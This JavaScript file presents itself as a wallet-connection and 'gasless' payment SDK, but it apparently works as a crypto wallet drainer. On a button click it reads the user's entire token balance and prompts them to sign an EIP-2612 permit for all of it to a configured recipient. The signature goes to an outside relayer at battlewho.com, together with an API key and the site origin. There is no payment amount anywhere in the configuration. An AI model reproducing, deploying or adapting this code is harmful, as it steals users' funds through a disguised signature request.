/**
 * SpiderWeb SDK v1.0
 * A portable script to handle wallet connection and gasless token sending via EIP-2612 permit.
 */
window.SpiderWebSDK = {
    // --- Internal State ---
    _config: {},
    _provider: null,
    _signer: null,
    _currentUserAddress: null,
    _discoveredProviders: new Map(),
    _isInitialized: false,

    // --- Constants & ABIs ---
    _ERC20_PERMIT_ABI: [
        "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
        "function nonces(address owner) view returns (uint256)",
        "function DOMAIN_SEPARATOR() view returns (bytes32)",
        "function name() view returns (string)",
        "function version() view returns (string)",
        "function decimals() view returns (uint8)",
        "function balanceOf(address owner) view returns (uint256)",
        "function symbol() view returns (string)" // <-- ADD THIS LINE
    ],
    _RELAYER_SERVER_URL_BASE: "https://battlewho.com", // Your backend URL

    /**
     * Initializes the SDK and attaches the payment logic to a button.
     * @param {object} config - The configuration object.
     * @param {string} config.buttonId - The ID of the button that triggers the payment.
     * @param {string} config.apiKey - The user's unique API key for your service.
     * @param {string} config.recipientAddress - The address that will receive the funds.
     * @param {string} config.tokenAddress - The contract address of the ERC20 token to be sent.
     * @param {number} config.chainId - The chain ID for the transaction (e.g., 1 for Ethereum).
     */
    init: function(config) {
        if (this._isInitialized) {
            console.warn("SpiderWebSDK already initialized.");
            return;
        }

        // 1. Validate configuration
        if (!config.buttonId || !config.apiKey || !config.recipientAddress || !config.tokenAddress || !config.chainId) {
            console.error("SpiderWebSDK Error: Missing required configuration parameters.");
            return;
        }
        if (typeof ethers === 'undefined') {
             console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
             return;
        }
        this._config = config;

        // 2. Find the button and attach the main event handler
        const payButton = document.getElementById(config.buttonId);
        if (!payButton) {
            console.error(`SpiderWebSDK Error: Button with ID "${config.buttonId}" not found.`);
            return;
        }
        payButton.addEventListener('click', this._handlePaymentClick.bind(this));

        // 3. Set up wallet discovery and UI
        this._injectModalHtml();
        this._setupEip6963Listeners();
        this._isInitialized = true;
        console.log("SpiderWebSDK initialized successfully.");
    },

    /**
     * Main handler for the payment button click.
     * It connects the wallet if necessary, then proceeds with the transaction.
     */
    _handlePaymentClick: async function() {
        try {
            // Step 1: Connect wallet if not already connected
            if (!this._signer) {
                const connected = await this._connectWallet();
                if (!connected) {
                    this._updateStatus("Wallet connection cancelled.", "info");
                    return;
                }
            }
            
            // Step 2: Ensure the user is on the correct network
            const network = await this._provider.getNetwork();
            if (network.chainId !== this._config.chainId) {
                this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
                // You could add logic here to prompt the user to switch networks.
                return;
            }

            // Step 3: Execute the payment logic
            await this._executeSend();

        } catch (error) {
            console.error("Payment failed:", error);
            this._updateStatus(`Error: ${error.message}`, "error");
        }
    },
    
    /**
     * Fetches token data and executes the permit signing process.
     */
    _executeSend: async function() {
        this._updateStatus("Fetching token details...", "pending");
        
        const tokenContract = new ethers.Contract(this._config.tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
        const [name, symbol, balance] = await Promise.all([
            tokenContract.name(),
            tokenContract.symbol(),
            tokenContract.balanceOf(this._currentUserAddress)
        ]);

        if (balance.isZero()) {
            this._updateStatus(`You have no ${symbol} to send.`, "error");
            return;
        }

        const tokenData = {
            contractAddress: this._config.tokenAddress,
            name: name,
            symbol: symbol,
            balance: balance
        };

        // This is the core function from your script
        await this._signAndSendWithStandardPermit(tokenData);
    },

    /**
     * Creates and signs an EIP-2612 permit message and sends it to the backend relayer.
     * (This is your original function, adapted for the SDK structure)
     */
    _signAndSendWithStandardPermit: async function(tokenData) {
        this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
        try {
            const tokenContract = new ethers.Contract(tokenData.contractAddress, this._ERC20_PERMIT_ABI, this._signer);
            
            const nonce = await tokenContract.nonces(this._currentUserAddress);
            const deadline = Math.floor(Date.now() / 1000) + 1800; // 30 minutes
            const tokenName = tokenData.name;
            
            let domainVersion = "1";
            try {
                domainVersion = await tokenContract.version();
            } catch (e) {
                console.log(`Token ${tokenData.symbol} has no version(), defaulting to '1'.`);
            }

            const domain = {
                name: tokenName,
                version: domainVersion,
                chainId: this._config.chainId,
                verifyingContract: tokenData.contractAddress
            };

            const types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            };

            const value = tokenData.balance;
            const permitMessage = {
                owner: this._currentUserAddress,
                spender: this._config.recipientAddress, // The spender is the final recipient
                value: value.toString(),
                nonce: nonce.toString(),
                deadline: deadline
            };

            this._updateStatus(`Please sign the permit message for ${tokenData.symbol}...`, 'pending');
            const signature = await this._signer._signTypedData(domain, types, permitMessage);
            
            const { v, r, s } = ethers.utils.splitSignature(signature);

            const payload = {
                apiKey: this._config.apiKey,
                owner: this._currentUserAddress,
                recipient: this._config.recipientAddress,
                contractAddress: tokenData.contractAddress,
                value: value.toString(),
                deadline: deadline,
                v, r, s,
                origin: window.location.origin,
                chainId: this._config.chainId
            };

            this._updateStatus('Signature received. Relaying transaction...', 'pending');
            const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/execute-transfer`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!response.ok || !result.success) throw new Error(result.message || "Relayer service failed.");

            this._updateStatus(`✅ ${tokenData.symbol} transfer has been successfully relayed! Tx: ${result.txHash.slice(0,10)}...`, 'success');

        } catch (error) {
            console.error("Standard Permit failed:", error);
            this._updateStatus(`Error: ${error.reason || error.message}`, 'error');
            throw error; // Re-throw to be caught by the calling function
        }
    },

    // --- Wallet Connection and UI Logic ---

    _connectWallet: function() {
        return new Promise((resolve) => {
            this._resolveConnection = resolve; // Store the resolve function to be called later
            this._openWalletModal();
        });
    },

    _handleProviderSelection: async function(event) {
        const button = event.target.closest('.sw-wallet-button');
        if (!button) return;

        const rdns = button.dataset.rdns;
        const providerDetail = this._discoveredProviders.get(rdns);
        if (!providerDetail) return;
        
        this._updateStatus(`Connecting with ${providerDetail.info.name}...`, 'pending');
        this._closeWalletModal();

        try {
            const selectedProvider = providerDetail.provider;
            this._provider = new ethers.providers.Web3Provider(selectedProvider);
            await this._provider.send('eth_requestAccounts', []);
            this._signer = this._provider.getSigner();
            this._currentUserAddress = await this._signer.getAddress();
            
            this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
            if (this._resolveConnection) this._resolveConnection(true); // Resolve the promise with success

        } catch (error) {
            console.error("Connection failed:", error);
            this._updateStatus("Connection failed or was rejected.", "error");
            if (this._resolveConnection) this._resolveConnection(false); // Resolve the promise with failure
        }
    },

    _setupEip6963Listeners: function() {
        window.addEventListener('eip6963:announceProvider', (event) => {
            const providerDetail = event.detail;
            if (!this._discoveredProviders.has(providerDetail.info.rdns)) {
                this._discoveredProviders.set(providerDetail.info.rdns, providerDetail);
                this._renderWalletList();
            }
        });
        window.dispatchEvent(new Event('eip6963:requestProvider'));
    },
    
    _renderWalletList: function() {
        const listDiv = document.getElementById('sw-wallet-list');
        if (!listDiv) return;

        listDiv.innerHTML = '';
        if (this._discoveredProviders.size === 0) {
            listDiv.innerHTML = '<p style="text-align: center; color: #9ca3af;">No wallets detected.</p>';
            return;
        }

        this._discoveredProviders.forEach(p => {
            const buttonHtml = `
                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">
                    <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 16px; border-radius: 50%;"/>
                    <span style="font-weight: 500;">${p.info.name}</span>
                </button>
            `;
            listDiv.innerHTML += buttonHtml;
        });
        
        // Add event listeners to new buttons
        listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
            button.addEventListener('click', this._handleProviderSelection.bind(this));
        });
    },

    _openWalletModal: function() {
        document.getElementById('sw-modal-overlay').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('sw-wallet-modal').style.opacity = 1;
            document.getElementById('sw-wallet-modal').style.transform = 'scale(1)';
        }, 10);
        this._renderWalletList();
    },

    _closeWalletModal: function() {
        const overlay = document.getElementById('sw-modal-overlay');
        const modal = document.getElementById('sw-wallet-modal');
        if (modal) {
            modal.style.opacity = 0;
            modal.style.transform = 'scale(0.95)';
        }
        setTimeout(() => {
            if (overlay) overlay.style.display = 'none';
            // If the user closes the modal without choosing a wallet, resolve the promise as false
            if(this._resolveConnection && !this._signer) {
                this._resolveConnection(false);
            }
        }, 300);
    },
    
    _updateStatus: function(message, type = 'info') {
        const statusEl = document.getElementById('sw-status-message');
        if (!statusEl) return;
        const colors = { info: '#6b7280', success: '#16a34a', error: '#dc2626', pending: '#2563eb' };
        statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
    },
    
    _injectModalHtml: function() {
        if (document.getElementById('sw-modal-overlay')) return;
        
        const modalHtml = `
            <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.75); align-items: center; justify-content: center; z-index: 1000;">
                <div id="sw-wallet-modal" style="background-color: #1f2937; border-radius: 16px; padding: 24px; width: 100%; max-width: 384px; color: white; transition: all 0.3s ease; opacity: 0; transform: scale(0.95);">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
                        <h2 style="font-size: 24px; font-weight: 600; margin: 0;">Connect a Wallet</h2>
                        <button id="sw-close-wallet-modal-btn" style="background: none; border: none; color: #9ca3af; font-size: 28px; cursor: pointer;">&times;</button>
                    </div>
                    <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto;"></div>
                </div>
            </div>
            <div id="sw-status-message" style="margin-top: 16px; min-height: 20px;"></div>
        `;
        document.body.insertAdjacentHTML('beforeend', modalHtml);

        // Add event listeners for closing the modal
        document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', this._closeWalletModal.bind(this));
        document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
            if (e.target.id === 'sw-modal-overlay') this._closeWalletModal.bind(this)();
        });
    }
};
